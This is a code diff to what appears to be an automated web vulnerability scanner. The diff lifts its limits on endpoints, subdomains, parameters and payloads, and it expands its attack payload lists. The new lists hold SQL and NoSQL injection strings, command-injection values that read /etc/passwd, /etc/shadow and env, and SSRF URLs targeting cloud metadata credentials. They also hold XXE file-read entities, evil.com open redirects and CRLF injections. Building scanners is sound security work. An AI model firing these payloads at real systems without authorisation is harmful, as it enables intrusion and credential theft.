@@ -171,12 +171,12 @@ serve(async (req) => {
       return { severityCounts, findings };
     };
 
-    // Safety timeout at 150s
+    // Safety timeout at 280s (edge function limit is 300s)
     const timeoutId = setTimeout(async () => {
       console.log('[TIMEOUT SAFETY] Saving partial results...');
       await saveResultsToDB('completed');
       await emitProgress('complete', 14, 100, `Scan saved (partial). ${allFindings.length} findings.`);
-    }, 150000);
+    }, 280000);
 
     try {
       // ═══════════════════════════════════════════════════════════════════
@@ -305,11 +305,11 @@ serve(async (req) => {
       await emitProgress('owasp_scan', 5, 27, `Running OWASP Top 10 assessment on ${discoveredEndpoints.length} endpoints...`);
       await emitAIThought(`Starting comprehensive OWASP Top 10 testing: A01-Broken Access Control, A02-Crypto Failures, A03-Injection, A04-Insecure Design, A05-Misconfiguration, A06-Vulnerable Components, A07-Auth Failures, A08-Data Integrity, A09-Logging Failures, A10-SSRF. Each finding requires dual-confirmation.`, 'owasp_scan', 5);
 
-      const endpointsToTest = discoveredEndpoints.slice(0, 120);
+      const endpointsToTest = discoveredEndpoints; // No limit — test ALL discovered endpoints
       for (let i = 0; i < endpointsToTest.length; i++) {
         const endpoint = endpointsToTest[i];
-        if (i % 5 === 0) {
-          await emitProgress('owasp_scan', 5, 27 + Math.round((i / endpointsToTest.length) * 15),
+        if (i % 3 === 0) {
+          await emitProgress('owasp_scan', 5, 27 + Math.round((i / endpointsToTest.length) * 20),
             `Testing endpoint ${i + 1}/${endpointsToTest.length}`, { currentEndpoint: endpoint });
         }
         const endpointFindings = await assessEndpointOWASP(endpoint, fingerprint, aiPayloads, previousPayloads);
@@ -317,7 +317,7 @@ serve(async (req) => {
       }
       
       await emitAIThought(`OWASP assessment done. ${allFindings.filter(f => !f.falsePositive).length} findings so far. ${allFindings.filter(f => f.dualConfirmed).length} are dual-confirmed. Moving to specialized scans.`, 'owasp_scan', 5);
-      await emitProgress('owasp_scan', 5, 42, `OWASP scan: ${allFindings.filter(f => !f.falsePositive).length} findings`);
+      await emitProgress('owasp_scan', 5, 47, `OWASP scan: ${allFindings.filter(f => !f.falsePositive).length} findings`);
 
       // ═══════════════════════════════════════════════════════════════════
       // PHASE 6: CORS SCAN
@@ -325,7 +325,7 @@ serve(async (req) => {
       await emitProgress('cors_scan', 6, 44, 'Testing CORS misconfigurations...');
       await emitAIThought(`Testing CORS policies across all targets. I'll inject malicious Origin headers via both OPTIONS preflight and GET requests. Only flagging if both agree — this eliminates false positives from CDN/proxy rewrites.`, 'cors_scan', 6);
       
-      const corsTargets = [targetUrl.toString(), ...subdomains.slice(0, 10).map(s => `https://${s}/`)];
+      const corsTargets = [targetUrl.toString(), ...subdomains.map(s => `https://${s}/`)]; // ALL subdomains
       for (const t of corsTargets) {
         const corsFindings = await scanCORS(t);
         allFindings.push(...corsFindings);
@@ -338,7 +338,7 @@ serve(async (req) => {
       await emitProgress('traversal_scan', 7, 50, 'Testing directory traversal...');
       await emitAIThought(`Testing path traversal with multiple encodings: raw ../, URL-encoded %2e%2e, double-encoded %252e, null byte injection. Checking both Linux (/etc/passwd) and Windows (win.ini) indicators.`, 'traversal_scan', 7);
       
-      for (const t of [targetUrl.toString(), ...subdomains.slice(0, 5).map(s => `https://${s}/`)]) {
+      for (const t of [targetUrl.toString(), ...subdomains.map(s => `https://${s}/`)]) { // ALL subdomains
         const travFindings = await scanDirectoryTraversal(t, discoveryResults.params || []);
         allFindings.push(...travFindings);
       }
@@ -350,7 +350,7 @@ serve(async (req) => {
       await emitProgress('cookie_scan', 8, 56, 'Auditing cookie and session security...');
       await emitAIThought(`Checking all Set-Cookie headers for missing HttpOnly, Secure, SameSite flags. Cross-referencing with inline scripts to confirm actual cookie theft risk (not just theoretical).`, 'cookie_scan', 8);
       
-      for (const t of [targetUrl.toString(), ...subdomains.slice(0, 5).map(s => `https://${s}/`)]) {
+      for (const t of [targetUrl.toString(), ...subdomains.map(s => `https://${s}/`)]) { // ALL subdomains
         const cookieFindings = await scanCookieSecurity(t);
         allFindings.push(...cookieFindings);
       }
@@ -414,10 +414,10 @@ serve(async (req) => {
 
       // Build endpoint tree
       const epNode: TargetNode = { name: 'Endpoints', type: 'endpoint', children: [] };
-      for (const ep of discoveredEndpoints.slice(0, 30)) {
+      for (const ep of discoveredEndpoints.slice(0, 100)) {
         const vulns = verifiedFindings.filter(f => f.endpoint === ep);
         const epChild: TargetNode = { name: ep.replace(targetUrl.origin, ''), type: 'endpoint', children: [], meta: { vulnCount: vulns.length } };
-        for (const v of vulns.slice(0, 5)) {
+        for (const v of vulns.slice(0, 10)) {
           epChild.children.push({ name: `[${v.severity.toUpperCase()}] ${v.title}`, type: 'vulnerability', children: [], meta: { cwe: v.cwe, confidence: v.confidence } });
         }
         epNode.children.push(epChild);
@@ -577,15 +577,30 @@ async function generateOwaspPayloads(
       "1 OR 1=1", "-1 OR 1=1",
       "1' OR '1'='1'--", "1' OR '1'='1'#",
       "1/**/OR/**/1=1", "1'%20OR%20'1'%3D'1",
+      "' UNION ALL SELECT NULL,@@version--",
+      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+      "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
+      "' HAVING 1=1--", "' GROUP BY 1--",
+      "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+      "' OR SLEEP(5)#",
+      "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+      "%27%20OR%201%3D1--",
+      "'+OR+'1'%3D'1",
     ],
     a03_nosqli: [
       '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
       "true, $where: '1 == 1'",
+      '[$ne]=1', '{"$or":[{},{"a":"a"}]}',
+      '{"$where":"sleep(5000)"}',
     ],
     a03_cmdi: [
       '; ls -la', '| cat /etc/passwd', '`id`',
       '$(whoami)', '; ping -c 3 127.0.0.1',
       '| dir', '& net user',
+      '; uname -a', '| cat /etc/shadow', '$(cat /etc/passwd)',
+      '; curl http://127.0.0.1', '%0aid', '\nid',
+      '`cat /etc/passwd`', '& whoami', '; env',
+      '| type C:\\Windows\\win.ini',
     ],
     // A04: Insecure Design
     a04_design: [
@@ -606,26 +621,47 @@ async function generateOwaspPayloads(
       'admin:admin', 'admin:password', 'root:root',
       'test:test', 'admin:123456',
     ],
-    // A08: Data Integrity Failures (deserialization)
+    // A08: Data Integrity Failures (deserialization + prototype pollution)
     a08_integrity: [
       'O:8:"stdClass":0:{}', // PHP deserialization
       'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', // Java
       '{"__proto__":{"polluted":true}}', // Prototype pollution
+      '{"constructor":{"prototype":{"isAdmin":true}}}',
+      'a]0[]=1', // PHP array injection
     ],
     // A09: Logging & Monitoring (CRLF injection for log poisoning)
     a09_logging: [
       '%0d%0aInjected-Header:true',
       '\r\nSet-Cookie:pwned=1',
       '%0aFake-Log-Entry',
+      '%0d%0aLocation: https://evil.com',
     ],
     // A10: SSRF
     a10_ssrf: [
       'http://169.254.169.254/latest/meta-data/',
+      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
       'http://127.0.0.1:80/',
+      'http://127.0.0.1:8080/',
+      'http://127.0.0.1:3000/',
       'file:///etc/passwd',
+      'file:///etc/hosts',
       'http://[::1]/',
       'http://0x7f000001/',
       'gopher://127.0.0.1:25/',
+      'http://metadata.google.internal/computeMetadata/v1/',
+      'http://100.100.100.200/latest/meta-data/',
+      'dict://127.0.0.1:11211/info',
+    ],
+    // Open Redirect
+    a01_redirect: [
+      '//evil.com', 'https://evil.com', '/\\evil.com',
+      '//evil.com/%2f..', 'https:evil.com', '////evil.com',
+      'javascript:alert(1)//', '/redirect?url=https://evil.com',
+    ],
+    // XXE (XML External Entity)
+    a03_xxe: [
+      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
     ]
   };
 
@@ -736,7 +772,7 @@ async function enumerateSubdomains(hostname: string): Promise<string[]> {
     }));
   }
 
-  return Array.from(found).slice(0, 50);
+  return Array.from(found); // No limit — enumerate ALL subdomains
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -770,7 +806,7 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
 
       // Extract forms
       const formMatches = html.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
-      results.forms = formMatches.slice(0, 20).map((form: string, i: number) => {
+      results.forms = formMatches.slice(0, 50).map((form: string, i: number) => {
         const action = form.match(/action=["']([^"']+)["']/i)?.[1] || '';
         const method = form.match(/method=["']([^"']+)["']/i)?.[1] || 'GET';
         const inputs = (form.match(/<input[^>]+>/gi) || []).map((inp: string) => {
@@ -827,10 +863,10 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
   const crawledUrls = new Set<string>();
   const linksToCrawl = results.endpoints.filter((ep: string) => {
     try { return new URL(ep).hostname === target.hostname; } catch { return false; }
-  }).slice(0, 30);
+  }); // No limit — crawl ALL discovered links
 
-  for (let i = 0; i < linksToCrawl.length; i += 8) {
-    const batch = linksToCrawl.slice(i, i + 8);
+  for (let i = 0; i < linksToCrawl.length; i += 10) {
+    const batch = linksToCrawl.slice(i, i + 10);
     await Promise.all(batch.map(async (link: string) => {
       if (crawledUrls.has(link)) return;
       crawledUrls.add(link);
@@ -879,17 +915,28 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
 
   // Common path discovery
   const commonPaths = [
-    '/api', '/api/v1', '/api/v2', '/graphql', '/rest',
-    '/admin', '/login', '/signin', '/auth', '/oauth', '/register',
-    '/dashboard', '/panel', '/swagger', '/api-docs', '/openapi.json',
-    '/robots.txt', '/sitemap.xml', '/wp-admin', '/wp-json',
-    '/phpinfo.php', '/server-status', '/.git/config', '/.env',
-    '/health', '/healthz', '/metrics', '/debug', '/test',
-    '/backup', '/upload', '/uploads', '/files', '/static',
+    '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/rest',
+    '/admin', '/login', '/signin', '/auth', '/oauth', '/register', '/signup',
+    '/dashboard', '/panel', '/swagger', '/api-docs', '/openapi.json', '/swagger.json',
+    '/robots.txt', '/sitemap.xml', '/wp-admin', '/wp-json', '/wp-login.php',
+    '/phpinfo.php', '/server-status', '/server-info', '/.git/config', '/.git/HEAD', '/.env',
+    '/health', '/healthz', '/metrics', '/debug', '/test', '/info', '/status',
+    '/backup', '/upload', '/uploads', '/files', '/static', '/tmp', '/temp',
     '/.svn/entries', '/.DS_Store', '/web.config', '/crossdomain.xml',
-    '/wp-config.php.bak', '/.htpasswd', '/config.yml',
-    '/search', '/product', '/item', '/category', '/user', '/comment',
-    '/cgi-bin/', '/images/', '/includes/', '/js/',
+    '/wp-config.php.bak', '/.htpasswd', '/config.yml', '/config.json', '/config.xml',
+    '/search', '/product', '/item', '/category', '/user', '/comment', '/account',
+    '/cgi-bin/', '/images/', '/includes/', '/js/', '/css/', '/fonts/',
+    '/console', '/actuator', '/actuator/env', '/actuator/health', '/actuator/info',
+    '/elmah.axd', '/trace.axd', '/wp-content/debug.log', '/error_log', '/error.log',
+    '/.well-known/security.txt', '/security.txt', '/humans.txt',
+    '/api/users', '/api/user', '/api/config', '/api/settings', '/api/admin',
+    '/xmlrpc.php', '/readme.html', '/license.txt', '/changelog.txt',
+    '/phpmyadmin', '/pma', '/adminer', '/adminer.php',
+    '/solr/', '/jenkins/', '/_cat/indices', '/_cluster/health',
+    '/manager/html', '/jmx-console', '/web-console',
+    '/feed', '/rss', '/atom', '/api/graphql',
+    '/reset', '/forgot', '/password', '/recover',
+    '/download', '/export', '/import', '/migrate',
   ];
 
   for (let i = 0; i < commonPaths.length; i += 10) {
@@ -1018,15 +1065,18 @@ async function assessEndpointOWASP(
       const fuzzParams = commonInjectableParams.filter(p => !existingParams.includes(p));
 
       // Combine: existing params first, then fuzz params
-      const allParams = [...paramsToTest, ...fuzzParams.slice(0, 15)];
+      const allParams = [...paramsToTest, ...fuzzParams]; // ALL params — no limit
 
       const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error', 'odbc',
         'syntax error', 'unclosed quotation', 'warning: mysql', 'you have an error in your sql',
         'microsoft sql', 'mysql_num_rows', 'supplied argument is not', 'pg_exec', 'mysql_result',
         'Unclosed quotation mark', 'mssql_query', 'ORA-01756', 'SQLSTATE', 'PDOException',
-        'mysql_connect', 'Access denied for user', 'Error en la consulta'];
+        'mysql_connect', 'Access denied for user', 'Error en la consulta',
+        'java.sql.sqlexception', 'org.hibernate', 'com.mysql', 'unknown column',
+        'quoted string not properly terminated', 'unterminated string',
+        'query failed', 'expects parameter', 'valid mysql result', 'pdo::__construct'];
 
-      for (const param of allParams.slice(0, 20)) {
+      for (const param of allParams) { // ALL params — no limit
         // === BLIND SQLi: Baseline comparison ===
         try {
           // Get baseline response with normal value
@@ -1165,7 +1215,7 @@ async function assessEndpointOWASP(
 
         // Command injection check
         const cmdiPayloads = payloads.a03_cmdi || [];
-        for (const payload of cmdiPayloads.slice(0, 3)) {
+        for (const payload of cmdiPayloads) { // ALL cmdi payloads
           try {
             const cmdiUrl = new URL(endpoint);
             cmdiUrl.searchParams.set(param, payload);
@@ -1189,7 +1239,7 @@ async function assessEndpointOWASP(
 
         // NoSQLi check
         const nosqliPayloads = payloads.a03_nosqli || [];
-        for (const payload of nosqliPayloads.slice(0, 2)) {
+        for (const payload of nosqliPayloads) { // ALL nosqli payloads
           try {
             const nosqlUrl = new URL(endpoint);
             nosqlUrl.searchParams.set(param, payload);
@@ -1397,8 +1447,8 @@ async function scanDirectoryTraversal(targetUrl: string, extractedParams: string
   ];
   const fileParams = [...new Set([...extractedParams, 'file', 'path', 'page', 'include', 'load', 'template', 'doc', 'read', 'view'])];
 
-  for (const param of fileParams.slice(0, 8)) {
-    for (const payload of traversalPayloads.slice(0, 3)) {
+  for (const param of fileParams) { // Test ALL file params
+    for (const payload of traversalPayloads) { // Test ALL traversal payloads
       try {
         const testUrl = new URL(targetUrl);
         testUrl.searchParams.set(param, payload);
@@ -1663,17 +1713,29 @@ async function performDeepInjectionWithMutation(
   };
 
   // ── Test forms ──────────────────────────────────────────────────────
-  for (const form of (forms || []).slice(0, 10)) {
+  for (const form of (forms || [])) { // ALL forms
     const formUrl = form.action ? new URL(form.action, target).toString() : target.toString();
     for (const input of form.inputs) {
-      // XSS with mutation retry
-      for (const payload of (payloads.a03_xss || []).slice(0, 3)) {
+      // XSS with mutation retry — test ALL payloads
+      for (const payload of (payloads.a03_xss || [])) {
         if (failedPayloads.includes(payload)) continue;
         const { finding } = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
         if (finding) { findings.push(finding); break; }
       }
-      // SQLi with mutation retry
-      for (const payload of (payloads.a03_sqli || []).slice(0, 3)) {
+      // SQLi with mutation retry — test ALL payloads
+      for (const payload of (payloads.a03_sqli || [])) {
+        if (failedPayloads.includes(payload)) continue;
+        const { finding } = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
+        if (finding) { findings.push(finding); break; }
+      }
+      // Command injection with mutation retry
+      for (const payload of (payloads.a03_cmdi || [])) {
+        if (failedPayloads.includes(payload)) continue;
+        const { finding } = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
+        if (finding) { findings.push(finding); break; }
+      }
+      // SSRF via form inputs
+      for (const payload of (payloads.a10_ssrf || [])) {
         if (failedPayloads.includes(payload)) continue;
         const { finding } = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
         if (finding) { findings.push(finding); break; }
@@ -1681,9 +1743,15 @@ async function performDeepInjectionWithMutation(
     }
   }
 
-  // ── Test URL params with SSRF ────────────────────────────────────────
-  for (const param of (params || []).slice(0, 8)) {
-    for (const payload of (payloads.a10_ssrf || []).slice(0, 2)) {
+  // ── Test URL params with ALL injection types ─────────────────────────
+  for (const param of (params || [])) { // ALL params
+    for (const payload of (payloads.a10_ssrf || [])) { // ALL SSRF payloads
+      const { finding } = await fireWithRetry(target.toString(), param, payload, 'GET', param);
+      if (finding) { findings.push(finding); break; }
+    }
+    // Also test deserialization/integrity payloads on params
+    for (const payload of (payloads.a08_integrity || [])) {
+      if (failedPayloads.includes(payload)) continue;
       const { finding } = await fireWithRetry(target.toString(), param, payload, 'GET', param);
       if (finding) { findings.push(finding); break; }
     }
